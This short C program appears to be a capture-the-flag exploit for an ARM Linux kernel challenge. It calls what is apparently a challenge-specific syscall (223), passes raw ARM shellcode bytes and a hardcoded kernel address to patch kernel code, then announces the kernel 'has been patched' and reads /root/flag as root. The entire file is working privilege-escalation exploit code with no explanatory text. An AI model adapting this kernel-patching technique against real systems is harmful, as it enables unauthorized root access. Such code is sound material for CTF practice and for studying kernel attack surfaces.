#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <string.h>

#define INPUT_SIZE 1024

int main() {
    int counter = 0;
    int upper_syscall_descriptor = 223;
    int output = 0x800be384;
    char input[INPUT_SIZE] = "\x02\x20\x52\xe0\x04\x01\x2d\xe9\x01\x01\xbd\xe8\x1e\xff\x2f\xe1";

    syscall(upper_syscall_descriptor, input, output);
    printf("Kernel has been patched!");
    system("cat /root/flag");
}
